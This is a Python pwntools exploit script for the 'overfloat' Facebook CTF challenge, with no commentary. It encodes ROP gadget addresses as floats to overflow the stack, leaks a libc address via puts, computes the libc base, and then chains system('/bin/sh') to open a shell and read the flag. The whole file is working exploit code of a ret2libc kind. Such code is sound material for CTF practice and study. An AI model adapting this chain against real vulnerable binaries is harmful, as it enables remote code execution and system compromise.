from pwn import *
import tran
def sd(c="-6.2598534E18"):
	p.sendlineafter(": ",str(c))

libc=ELF("./overfloat").libc
#p=process('./overfloat')
p=remote("challenges.fbctf.com",1341)
for x in range(7):
	sd()
	sd()
rdi=0x00400a83
sd("5.881243E-39")
sd("0")
sd("8.827732E-39")
sd("0")


puts=0x000000000400690
sd("5.879826E-39")
sd("0")


rdi=0x00400a83
sd("5.881243E-39")
sd("0")
sd("2.8E-44")
sd("0")

rsi=0x400a81
sd("5.88124E-39")
sd("0")


sd("5.881103E-39")
sd(0)
sd()
sd()

#sig
sd("5.880005E-39")
sd("0")

main=0x400993
sd("5.880906E-39")
sd("0")

p.sendline("done")

p.readuntil("\n")
base=u64(p.readuntil("\n")[:-1].ljust(8,'\x00'))-(0x7ffff7a649c0-0x7ffff79e4000)
log.warning(hex(base))
libc.address=base
for x in range(7):
	sd()
	sd()

sh=libc.search("/bin/sh").next()
log.info(hex(sh))
log.info(hex(libc.sym['system']))
sd("5.881103E-39")
sd("0")

sd("5.881243E-39")
sd(0)
context.log_level='debug'
#gdb.attach(p,'b *0x000000000400982')
a=tran.tran(sh&0xffffffff)
b=tran.tran(base>>32)
c=tran.tran(libc.sym['system']&0xffffffff)
sd("{}".format(a))
sd("{}".format(b))
sd("{}".format(c))
sd("{}".format(b))
p.sendlineafter(": ","done")
p.sendline("cat home/overfloat/flag")
p.interactive()
